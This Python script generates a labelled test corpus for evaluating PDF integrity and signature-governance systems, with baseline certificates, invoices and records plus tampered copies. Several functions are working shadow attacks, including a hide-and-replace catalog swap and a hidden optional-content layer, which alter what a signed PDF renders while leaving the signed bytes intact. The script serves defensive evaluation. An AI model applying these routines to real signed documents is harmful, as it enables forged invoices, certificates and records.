"""
PolicyChain PDF Attack Corpus Generator
========================================
Generates a test corpus for evaluating PDF integrity / policy-governance
frameworks against three attack categories:

  A1. Direct document replacement       (byte-level whole-file substitution)
  A2. Metadata & incremental-update     (shadow-attack-style manipulations)
  A3. Scapy-based payload modification  (byte-level content-stream tampering)

Baseline classes: certificates, invoices, admin/policy records.

Output layout (under ./corpus):
    baseline/<class>/<name>.pdf
    attack_A1_replacement/<name>.pdf         (paired 1:1 with baseline)
    attack_A2_metadata/<variant>/<name>.pdf
    attack_A3_scapy/<name>.pdf
    manifest.csv                             (sha256 of every file + label)

Run:
    python generate_corpus.py
"""

from __future__ import annotations

import csv
import hashlib
import io
import os
import random
import shutil
from dataclasses import dataclass
from pathlib import Path
from typing import Callable

from reportlab.lib.pagesizes import LETTER
from reportlab.lib.units import inch
from reportlab.pdfgen import canvas
from pypdf import PdfReader, PdfWriter
from pypdf.generic import (
    NameObject,
    TextStringObject,
    DictionaryObject,
    ArrayObject,
    NumberObject,
    BooleanObject,
    IndirectObject,
    create_string_object as createStringObject,
)

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------

ROOT = Path(__file__).parent
CORPUS = ROOT / "corpus"
SEED = 20260901
random.seed(SEED)

CLASSES = {
    "certificate": 6,
    "invoice": 6,
    "admin_record": 6,
}

# ---------------------------------------------------------------------------
# Baseline PDF generation
# ---------------------------------------------------------------------------


def _draw_certificate(c: canvas.Canvas, idx: int) -> None:
    c.setTitle(f"Certificate of Completion #{idx:03d}")
    c.setAuthor("PolicyChain Issuing Authority")
    c.setSubject("Academic Certificate")
    c.setFont("Helvetica-Bold", 26)
    c.drawCentredString(4.25 * inch, 9.2 * inch, "CERTIFICATE OF COMPLETION")
    c.setFont("Helvetica", 12)
    c.drawCentredString(4.25 * inch, 8.6 * inch, "This is to certify that")
    c.setFont("Helvetica-Bold", 20)
    c.drawCentredString(4.25 * inch, 8.0 * inch, f"Recipient #{idx:03d}")
    c.setFont("Helvetica", 12)
    c.drawCentredString(
        4.25 * inch, 7.4 * inch,
        "has successfully completed the PolicyChain Governance Programme.",
    )
    c.drawCentredString(4.25 * inch, 6.9 * inch, f"Serial: CERT-2026-{idx:05d}")
    c.drawCentredString(4.25 * inch, 6.4 * inch, "Issued: 01 September 2026")
    c.setFont("Helvetica-Oblique", 10)
    c.drawCentredString(4.25 * inch, 2.0 * inch, "Registrar signature on file")


def _draw_invoice(c: canvas.Canvas, idx: int) -> None:
    c.setTitle(f"Invoice INV-2026-{idx:05d}")
    c.setAuthor("PolicyChain Billing")
    c.setSubject("Commercial Invoice")
    c.setFont("Helvetica-Bold", 20)
    c.drawString(1 * inch, 10 * inch, "INVOICE")
    c.setFont("Helvetica", 11)
    c.drawString(1 * inch, 9.5 * inch, f"Invoice No: INV-2026-{idx:05d}")
    c.drawString(1 * inch, 9.2 * inch, "Date: 2026-09-01")
    c.drawString(1 * inch, 8.9 * inch, f"Bill To: Customer #{idx:03d}")
    c.line(1 * inch, 8.5 * inch, 7.5 * inch, 8.5 * inch)
    c.setFont("Helvetica-Bold", 11)
    c.drawString(1 * inch, 8.2 * inch, "Item")
    c.drawString(5 * inch, 8.2 * inch, "Qty")
    c.drawString(6 * inch, 8.2 * inch, "Amount (USD)")
    c.setFont("Helvetica", 11)
    total = 0.0
    for row, item in enumerate(["Consulting", "License", "Support"]):
        qty = random.randint(1, 5)
        price = round(random.uniform(100, 900), 2)
        line_total = round(qty * price, 2)
        total += line_total
        y = (7.9 - row * 0.3) * inch
        c.drawString(1 * inch, y, item)
        c.drawString(5 * inch, y, str(qty))
        c.drawString(6 * inch, y, f"${line_total:,.2f}")
    c.setFont("Helvetica-Bold", 11)
    c.drawString(5 * inch, 6.7 * inch, "Total:")
    c.drawString(6 * inch, 6.7 * inch, f"${total:,.2f}")


def _draw_admin_record(c: canvas.Canvas, idx: int) -> None:
    c.setTitle(f"Administrative Record REC-{idx:05d}")
    c.setAuthor("PolicyChain Records Office")
    c.setSubject("Internal Policy Record")
    c.setFont("Helvetica-Bold", 18)
    c.drawString(1 * inch, 10 * inch, "ADMINISTRATIVE RECORD")
    c.setFont("Helvetica", 11)
    c.drawString(1 * inch, 9.4 * inch, f"Record ID: REC-2026-{idx:05d}")
    c.drawString(1 * inch, 9.1 * inch, "Classification: Internal")
    c.drawString(1 * inch, 8.8 * inch, "Effective Date: 2026-09-01")
    text = c.beginText(1 * inch, 8.2 * inch)
    text.setFont("Helvetica", 10)
    for line in [
        "This record documents an administrative action taken under the",
        "PolicyChain governance framework. All incremental updates to this",
        "document must be committed through the ledger and validated by",
        f"the quorum of validator nodes. Reference: policy-{idx:03d}.",
    ]:
        text.textLine(line)
    c.drawText(text)


DRAWERS: dict[str, Callable[[canvas.Canvas, int], None]] = {
    "certificate": _draw_certificate,
    "invoice": _draw_invoice,
    "admin_record": _draw_admin_record,
}


def make_baseline_pdf(cls: str, idx: int, path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    c = canvas.Canvas(str(path), pagesize=LETTER)
    DRAWERS[cls](c, idx)
    c.showPage()
    c.save()


# ---------------------------------------------------------------------------
# Attack A1 — Direct document replacement
# ---------------------------------------------------------------------------
# Swap the file contents entirely with an attacker-controlled PDF while
# keeping the original filename. Simulates ledger-committed-doc substitution.

def attack_direct_replacement(src: Path, dst: Path, cls: str, idx: int) -> None:
    """Replace with a superficially-similar but different PDF."""
    dst.parent.mkdir(parents=True, exist_ok=True)
    c = canvas.Canvas(str(dst), pagesize=LETTER)
    c.setTitle("FORGED")
    c.setAuthor("Attacker")
    c.setFont("Helvetica-Bold", 22)
    c.drawString(1 * inch, 10 * inch, f"[{cls.upper()}] (ATTACKER SUBSTITUTED)")
    c.setFont("Helvetica", 12)
    c.drawString(1 * inch, 9.4 * inch,
                 f"Original was {cls} #{idx:03d}; this file replaces it.")
    c.drawString(1 * inch, 9.0 * inch,
                 "Amounts, recipient identities, and terms have been altered.")
    if cls == "invoice":
        c.setFont("Helvetica-Bold", 14)
        c.drawString(1 * inch, 8.4 * inch, "Total: $999,999.99  (was much smaller)")
        c.drawString(1 * inch, 8.1 * inch, "Payee account: attacker@example.com")
    elif cls == "certificate":
        c.setFont("Helvetica-Bold", 14)
        c.drawString(1 * inch, 8.4 * inch, "Recipient: Mallory the Attacker")
    else:
        c.setFont("Helvetica-Bold", 14)
        c.drawString(1 * inch, 8.4 * inch, "Policy: revoked / superseded")
    c.showPage()
    c.save()


# ---------------------------------------------------------------------------
# Attack A2 — Metadata & incremental-update tampering
# ---------------------------------------------------------------------------
# Five shadow-attack-flavoured variants. Each starts from the signed baseline
# byte range and appends an incremental update section, or edits Info/Catalog
# entries. Byte-range covering the original prefix stays intact.

def _append_incremental_update(src_bytes: bytes, added_objects: bytes,
                                updated_xref_entries: list[tuple[int, int, int]],
                                trailer_updates: dict) -> bytes:
    """
    Append a minimal incremental-update section to a PDF.

    added_objects        : bytes containing one or more `N G obj ... endobj`
                           definitions. Their byte offsets (relative to the
                           final file) must be computed by the caller and
                           passed via updated_xref_entries.
    updated_xref_entries : list of (object_number, offset, generation).
    trailer_updates      : dict of trailer keys to inject/override in the new
                           trailer (e.g. {"/Root": "1 0 R", "/Info": "3 0 R"}).
    """
    out = bytearray(src_bytes)
    if not out.endswith(b"\n"):
        out.append(0x0A)
    # We need offsets *after* current end.
    added_start = len(out)
    out.extend(added_objects)
    xref_start = len(out)

    # Build xref as sparse subsections — one per contiguous run of changed
    # objects. Unmentioned objects are inherited from /Prev, which is the
    # correct incremental-update semantics.
    sorted_entries = sorted(updated_xref_entries, key=lambda e: e[0])
    subsections: list[list[tuple[int, int, int]]] = []
    for entry in sorted_entries:
        if subsections and entry[0] == subsections[-1][-1][0] + 1:
            subsections[-1].append(entry)
        else:
            subsections.append([entry])

    xref_lines = ["xref\n"]
    # PDF requires object 0 to appear once with generation 65535 as head of
    # free list. We emit it as its own subsection only if not already covered.
    if not any(s[0][0] == 0 for s in subsections):
        xref_lines.append("0 1\n0000000000 65535 f \n")
    for sub in subsections:
        first = sub[0][0]
        xref_lines.append(f"{first} {len(sub)}\n")
        for obj_num, offset, gen in sub:
            xref_lines.append(f"{offset:010d} {gen:05d} n \n")
    out.extend("".join(xref_lines).encode("ascii"))

    # Trailer
    trailer = ["trailer\n<<"]
    for k, v in trailer_updates.items():
        trailer.append(f" {k} {v}")
    trailer.append(" >>\n")
    trailer.append(f"startxref\n{xref_start}\n%%EOF\n")
    out.extend("".join(trailer).encode("ascii"))
    _ = added_start  # not used further; retained for readability
    return bytes(out)


def _find_prev_xref(src_bytes: bytes) -> int:
    idx = src_bytes.rfind(b"startxref")
    if idx == -1:
        raise ValueError("startxref not found")
    tail = src_bytes[idx + len(b"startxref"):]
    # Skip whitespace, read digits.
    num = ""
    for ch in tail:
        c = chr(ch)
        if c.isdigit():
            num += c
        elif num:
            break
    return int(num)


def _next_free_obj_num(src_bytes: bytes) -> int:
    """Heuristic: parse trailer /Size."""
    idx = src_bytes.rfind(b"/Size")
    if idx == -1:
        return 100
    tail = src_bytes[idx + 5:idx + 40]
    num = ""
    for ch in tail:
        c = chr(ch)
        if c.isdigit():
            num += c
        elif num:
            break
    return int(num) if num else 100


def _root_ref(src_bytes: bytes) -> str:
    idx = src_bytes.rfind(b"/Root")
    tail = src_bytes[idx + 5:idx + 40].decode("latin-1", "ignore")
    # Expect something like " 1 0 R"
    parts = tail.strip().split()
    return f"{parts[0]} {parts[1]} {parts[2]}"


# ---- A2.a  Info-dict (metadata) tamper --------------------------------------

def attack_a2_metadata(src: Path, dst: Path) -> None:
    """Add an incremental update that rewrites /Info entries (Author, Title)."""
    data = src.read_bytes()
    prev_xref = _find_prev_xref(data)
    next_obj = _next_free_obj_num(data)
    root = _root_ref(data)
    info_obj_num = next_obj

    info_body = (
        f"{info_obj_num} 0 obj\n"
        "<< /Title (TAMPERED TITLE) "
        "/Author (Attacker) "
        "/Producer (Shadow-Metadata v1) >>\n"
        "endobj\n"
    ).encode("ascii")

    # Compute offset of info obj after appending newline
    prefix = data if data.endswith(b"\n") else data + b"\n"
    info_offset = len(prefix)

    return _write(dst, _append_incremental_update(
        data,
        added_objects=info_body,
        updated_xref_entries=[(info_obj_num, info_offset, 0)],
        trailer_updates={
            "/Size": f"{info_obj_num + 1}",
            "/Root": root,
            "/Info": f"{info_obj_num} 0 R",
            "/Prev": f"{prev_xref}",
        },
    ))


# ---- A2.b  ViewerPreferences flip (display-preference change) --------------

def attack_a2_viewer_prefs(src: Path, dst: Path) -> None:
    """
    Shadow-attack style: append incremental update replacing the /Catalog
    with a copy that adds /ViewerPreferences forcing HideToolbar / HideMenubar
    and /PageMode FullScreen. Rendered document changes; byte-range prefix
    unchanged.
    """
    data = src.read_bytes()
    reader = PdfReader(io.BytesIO(data))
    root_indirect = reader.trailer.raw_get("/Root")
    root_obj_num = root_indirect.idnum
    root_gen = root_indirect.generation
    root_dict = root_indirect.get_object()

    # Rebuild catalog dictionary text with added viewer prefs.
    # We copy critical existing keys and inject ViewerPreferences + PageMode.
    keep = []
    for k, v in root_dict.items():
        if k in ("/ViewerPreferences", "/PageMode"):
            continue
        keep.append((k, v))

    def _ref(v):
        if isinstance(v, IndirectObject):
            return f"{v.idnum} {v.generation} R"
        return None

    parts = ["<<"]
    for k, v in keep:
        ref = _ref(v)
        if ref is not None:
            parts.append(f" {k} {ref}")
        elif isinstance(v, NameObject):
            parts.append(f" {k} {v}")
        # Skip other inline types — rare in a catalog and not needed for
        # this shadow-attack demonstration.
    if not any(" /Type " in p for p in parts):
        parts.append(" /Type /Catalog")
    parts.append(" /PageMode /FullScreen")
    parts.append(" /ViewerPreferences << /HideToolbar true /HideMenubar true"
                 " /HideWindowUI true /DisplayDocTitle false >>")
    parts.append(" >>\n")
    catalog_body = (
        f"{root_obj_num} {root_gen} obj\n" + "".join(parts) + "endobj\n"
    ).encode("ascii")

    prev_xref = _find_prev_xref(data)
    prefix = data if data.endswith(b"\n") else data + b"\n"
    cat_offset = len(prefix)

    return _write(dst, _append_incremental_update(
        data,
        added_objects=catalog_body,
        updated_xref_entries=[(root_obj_num, cat_offset, root_gen)],
        trailer_updates={
            "/Size": f"{_next_free_obj_num(data)}",
            "/Root": f"{root_obj_num} {root_gen} R",
            "/Prev": f"{prev_xref}",
        },
    ))


# ---- A2.c  Annotation-layer overlay ----------------------------------------

def attack_a2_annotation_overlay(src: Path, dst: Path) -> None:
    """
    Add a FreeText annotation on page 1 whose appearance masks part of the
    original content (classic shadow-Hide via annotation).
    """
    reader = PdfReader(str(src))
    writer = PdfWriter(clone_from=reader)
    page = writer.pages[0]

    # FreeText annotation dictionary
    annot = DictionaryObject()
    annot[NameObject("/Type")] = NameObject("/Annot")
    annot[NameObject("/Subtype")] = NameObject("/FreeText")
    annot[NameObject("/Rect")] = ArrayObject(
        [NumberObject(72), NumberObject(520),
         NumberObject(540), NumberObject(560)]
    )
    annot[NameObject("/Contents")] = createStringObject(
        "PAID IN FULL — OVERRIDDEN"
    )
    annot[NameObject("/DA")] = createStringObject("/Helv 14 Tf 1 0 0 rg")
    annot[NameObject("/F")] = NumberObject(4)  # printable
    annot[NameObject("/C")] = ArrayObject(
        [NumberObject(1), NumberObject(1), NumberObject(1)]
    )
    annot_ref = writer._add_object(annot)

    if "/Annots" in page:
        page[NameObject("/Annots")].append(annot_ref)
    else:
        page[NameObject("/Annots")] = ArrayObject([annot_ref])

    dst.parent.mkdir(parents=True, exist_ok=True)
    with open(dst, "wb") as f:
        writer.write(f)


# ---- A2.d  OCG (Optional Content Group) visibility toggle ------------------

def attack_a2_ocg_toggle(src: Path, dst: Path) -> None:
    """
    Inject an OCG (layer) plus a hidden text content stream bound to it, then
    flip the default visibility to ON. Rendered output gains content that was
    absent at signing time.
    """
    reader = PdfReader(str(src))
    writer = PdfWriter(clone_from=reader)
    page = writer.pages[0]

    # 1. OCG object
    ocg = DictionaryObject()
    ocg[NameObject("/Type")] = NameObject("/OCG")
    ocg[NameObject("/Name")] = createStringObject("ShadowLayer")
    ocg_ref = writer._add_object(ocg)

    # 2. Content stream with a marked-content sequence gated by the OCG
    from pypdf.generic import ContentStream, StreamObject, DecodedStreamObject
    hidden_text_ops = (
        b"/OC /MC0 BDC\n"
        b"q\nBT\n/F1 20 Tf\n72 700 Td\n"
        b"(SHADOW LAYER CONTENT REVEALED) Tj\n"
        b"ET\nQ\n"
        b"EMC\n"
    )
    stream_obj = DecodedStreamObject()
    stream_obj.set_data(hidden_text_ops)
    stream_ref = writer._add_object(stream_obj)

    # Append to page /Contents (make it an array if needed)
    contents = page.get("/Contents")
    if isinstance(contents, ArrayObject):
        contents.append(stream_ref)
    else:
        page[NameObject("/Contents")] = ArrayObject([contents, stream_ref])

    # 3. Wire Properties resource entry MC0 -> OCG
    resources = page[NameObject("/Resources")].get_object()
    props = resources.get("/Properties")
    if props is None:
        props = DictionaryObject()
        resources[NameObject("/Properties")] = props
    else:
        props = props.get_object()
    props[NameObject("/MC0")] = ocg_ref

    # 4. Catalog /OCProperties: default state ON
    root = writer._root_object
    ocprops = DictionaryObject()
    ocprops[NameObject("/OCGs")] = ArrayObject([ocg_ref])
    default_config = DictionaryObject()
    default_config[NameObject("/Name")] = createStringObject("Default")
    default_config[NameObject("/BaseState")] = NameObject("/ON")
    default_config[NameObject("/ON")] = ArrayObject([ocg_ref])
    ocprops[NameObject("/D")] = default_config
    root[NameObject("/OCProperties")] = ocprops

    dst.parent.mkdir(parents=True, exist_ok=True)
    with open(dst, "wb") as f:
        writer.write(f)


# ---- Benign: semantically-null /ModDate update -----------------------------

def _benign_moddate_update(src: Path, dst: Path) -> None:
    """
    Append an incremental update that only rewrites /Info with an added
    /ModDate. All other Info entries are preserved. This is inside A_k
    (metadata timestamp update, semantically null wrt rendering).
    """
    data = src.read_bytes()
    reader = PdfReader(io.BytesIO(data))
    prev_xref = _find_prev_xref(data)
    next_obj = _next_free_obj_num(data)
    info_obj_num = next_obj

    meta = reader.metadata or {}
    def esc(v: str) -> str:
        return v.replace("\\", r"\\").replace("(", r"\(").replace(")", r"\)")
    title = esc(str(meta.get("/Title", "")))
    author = esc(str(meta.get("/Author", "")))
    subject = esc(str(meta.get("/Subject", "")))
    producer = esc(str(meta.get("/Producer", "PolicyChain")))

    info_body = (
        f"{info_obj_num} 0 obj\n"
        f"<< /Title ({title}) /Author ({author}) "
        f"/Subject ({subject}) /Producer ({producer}) "
        f"/ModDate (D:20260901120000Z) >>\n"
        "endobj\n"
    ).encode("ascii", errors="replace")

    prefix = data if data.endswith(b"\n") else data + b"\n"
    info_offset = len(prefix)
    root = _root_ref(data)

    _write(dst, _append_incremental_update(
        data,
        added_objects=info_body,
        updated_xref_entries=[(info_obj_num, info_offset, 0)],
        trailer_updates={
            "/Size": f"{info_obj_num + 1}",
            "/Root": root,
            "/Info": f"{info_obj_num} 0 R",
            "/Prev": f"{prev_xref}",
        },
    ))


# ---- A2.e  Hide-and-Replace catalog swap -----------------------------------

def attack_a2_hide_and_replace(src: Path, dst: Path) -> None:
    """
    Append a full shadow page-tree and swap the catalog's /Pages reference
    via incremental update. Original signed byte range remains intact; the
    document renders as an entirely different document.
    """
    data = src.read_bytes()
    reader = PdfReader(io.BytesIO(data))
    root_indirect = reader.trailer.raw_get("/Root")
    root_obj_num = root_indirect.idnum
    root_gen = root_indirect.generation

    base_next = _next_free_obj_num(data)
    pages_num = base_next
    page_num = base_next + 1
    content_num = base_next + 2
    font_num = base_next + 3

    # Content stream
    content_stream_body = (
        b"BT /F1 24 Tf 72 720 Td "
        b"(SHADOW DOCUMENT (hide-and-replace)) Tj ET\n"
        b"BT /F1 12 Tf 72 690 Td "
        b"(Original content is unreachable; catalog swapped.) Tj ET\n"
    )
    content_body = (
        f"{content_num} 0 obj\n<< /Length {len(content_stream_body)} >>\n"
        "stream\n"
    ).encode("ascii") + content_stream_body + b"\nendstream\nendobj\n"

    font_body = (
        f"{font_num} 0 obj\n<< /Type /Font /Subtype /Type1 "
        "/BaseFont /Helvetica >>\nendobj\n"
    ).encode("ascii")

    page_body = (
        f"{page_num} 0 obj\n<< /Type /Page /Parent {pages_num} 0 R "
        f"/MediaBox [0 0 612 792] "
        f"/Contents {content_num} 0 R "
        f"/Resources << /Font << /F1 {font_num} 0 R >> >> >>\n"
        "endobj\n"
    ).encode("ascii")

    pages_body = (
        f"{pages_num} 0 obj\n<< /Type /Pages /Kids [{page_num} 0 R] "
        f"/Count 1 >>\nendobj\n"
    ).encode("ascii")

    catalog_body = (
        f"{root_obj_num} {root_gen} obj\n"
        f"<< /Type /Catalog /Pages {pages_num} 0 R >>\n"
        "endobj\n"
    ).encode("ascii")

    prefix = data if data.endswith(b"\n") else data + b"\n"
    off = len(prefix)
    pages_off = off
    page_off = pages_off + len(pages_body)
    content_off = page_off + len(page_body)
    font_off = content_off + len(content_body)
    catalog_off = font_off + len(font_body)

    added = pages_body + page_body + content_body + font_body + catalog_body

    prev_xref = _find_prev_xref(data)
    return _write(dst, _append_incremental_update(
        data,
        added_objects=added,
        updated_xref_entries=[
            (pages_num, pages_off, 0),
            (page_num, page_off, 0),
            (content_num, content_off, 0),
            (font_num, font_off, 0),
            (root_obj_num, catalog_off, root_gen),
        ],
        trailer_updates={
            "/Size": f"{font_num + 1}",
            "/Root": f"{root_obj_num} {root_gen} R",
            "/Prev": f"{prev_xref}",
        },
    ))


# ---------------------------------------------------------------------------
# Attack A3 — Scapy-style byte-level payload modification
# ---------------------------------------------------------------------------
# Simulates a MitM byte-level rewrite of a content stream. We flip
# literal-string bytes inside the first uncompressed content stream so the
# rendered text changes and the file hash breaks.

def attack_a3_scapy_bytes(src: Path, dst: Path) -> None:
    data = bytearray(src.read_bytes())

    # Reportlab-produced PDFs use FlateDecode-compressed streams by default,
    # so byte-flipping raw text isn't visible. Instead we corrupt a random
    # window inside the first stream, which is what a naive Scapy MitM would
    # do: rewrite bytes on the wire without understanding PDF structure.
    s_idx = data.find(b"stream\n")
    e_idx = data.find(b"endstream", s_idx)
    if s_idx == -1 or e_idx == -1:
        raise RuntimeError("No stream found for A3 target")

    payload_start = s_idx + len(b"stream\n")
    payload_end = e_idx
    length = payload_end - payload_start
    if length < 32:
        raise RuntimeError("Stream too short for A3 tampering")

    rng = random.Random(SEED + hash(src.name) % 100000)
    window = min(16, length // 4)
    start = payload_start + rng.randint(0, length - window - 1)
    for i in range(window):
        data[start + i] ^= 0xA5  # deterministic bit-flip pattern

    dst.parent.mkdir(parents=True, exist_ok=True)
    dst.write_bytes(bytes(data))


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _write(dst: Path, blob: bytes) -> None:
    dst.parent.mkdir(parents=True, exist_ok=True)
    dst.write_bytes(blob)


def sha256(p: Path) -> str:
    h = hashlib.sha256()
    h.update(p.read_bytes())
    return h.hexdigest()


# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------

@dataclass
class Sample:
    category: str      # baseline / A1 / A2.* / A3
    doc_class: str     # certificate / invoice / admin_record
    path: Path


def main() -> None:
    if CORPUS.exists():
        shutil.rmtree(CORPUS)
    CORPUS.mkdir(parents=True)

    samples: list[Sample] = []

    # 1. Baselines
    for cls, n in CLASSES.items():
        for i in range(1, n + 1):
            p = CORPUS / "baseline" / cls / f"{cls}_{i:03d}.pdf"
            make_baseline_pdf(cls, i, p)
            samples.append(Sample("baseline", cls, p))

    # 2. A1 Direct replacement (paired 1:1)
    for s in list(samples):
        if s.category != "baseline":
            continue
        idx = int(s.path.stem.split("_")[-1])
        dst = CORPUS / "attack_A1_replacement" / s.doc_class / s.path.name
        attack_direct_replacement(s.path, dst, s.doc_class, idx)
        samples.append(Sample("A1_replacement", s.doc_class, dst))

    # 3. A2 Metadata / incremental-update tampering — 5 variants
    a2_variants = {
        "a_metadata_info":     attack_a2_metadata,
        "b_viewer_prefs":      attack_a2_viewer_prefs,
        "c_annotation_overlay": attack_a2_annotation_overlay,
        "d_ocg_toggle":        attack_a2_ocg_toggle,
        "e_hide_and_replace":  attack_a2_hide_and_replace,
    }
    for variant, fn in a2_variants.items():
        for s in list(samples):
            if s.category != "baseline":
                continue
            dst = (CORPUS / "attack_A2_metadata" / variant /
                   s.doc_class / s.path.name)
            try:
                fn(s.path, dst)
                samples.append(Sample(f"A2_{variant}", s.doc_class, dst))
            except Exception as e:
                print(f"[warn] {variant} failed on {s.path.name}: {e}")

    # 3b. Benign transformations (for FRR analysis)
    for s in list(samples):
        if s.category != "baseline":
            continue
        dst = CORPUS / "benign_moddate" / s.doc_class / s.path.name
        try:
            _benign_moddate_update(s.path, dst)
            samples.append(Sample("benign_moddate", s.doc_class, dst))
        except Exception as e:
            print(f"[warn] benign_moddate failed on {s.path.name}: {e}")

    # 4. A3 Scapy-style byte tampering
    for s in list(samples):
        if s.category != "baseline":
            continue
        dst = CORPUS / "attack_A3_scapy" / s.doc_class / s.path.name
        try:
            attack_a3_scapy_bytes(s.path, dst)
            samples.append(Sample("A3_scapy", s.doc_class, dst))
        except Exception as e:
            print(f"[warn] A3 failed on {s.path.name}: {e}")

    # 5. Manifest
    manifest = CORPUS / "manifest.csv"
    with manifest.open("w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["category", "doc_class", "relative_path", "sha256",
                    "size_bytes"])
        for s in samples:
            rel = s.path.relative_to(CORPUS).as_posix()
            w.writerow([s.category, s.doc_class, rel, sha256(s.path),
                        s.path.stat().st_size])

    # 6. Summary
    counts: dict[str, int] = {}
    for s in samples:
        counts[s.category] = counts.get(s.category, 0) + 1
    print("\nCorpus generated under:", CORPUS)
    for k in sorted(counts):
        print(f"  {k:32s} {counts[k]:4d} files")
    print(f"  manifest                          {manifest.relative_to(ROOT)}")


if __name__ == "__main__":
    main()
